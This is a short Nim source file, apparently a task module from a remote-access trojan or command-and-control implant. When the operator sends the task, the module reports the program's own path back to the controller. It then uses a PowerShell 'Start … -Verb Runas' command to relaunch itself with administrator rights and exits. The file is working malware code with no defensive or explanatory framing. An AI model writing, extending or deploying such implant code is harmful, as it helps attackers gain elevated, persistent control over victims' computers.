import net, os, osproc, json
import ../client/[communication, types]

proc executeTask*(app: App, taskId: int, params: seq[string]) =
  let taskOutput = TaskOutput(
    task: "output",
    taskId: taskId,
    error: "",
    data: %*{}
  )

  var filePath = getAppFileName()

  taskOutput.addData(Text, "path", "Current app path is: " & filePath)
  app.sendOutput(taskOutput)
  
  # socket.close()

  discard execCmdEx(
    "Powershell.exe Start " & filePath & " -Verb Runas",
    options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon}
  )

  quit()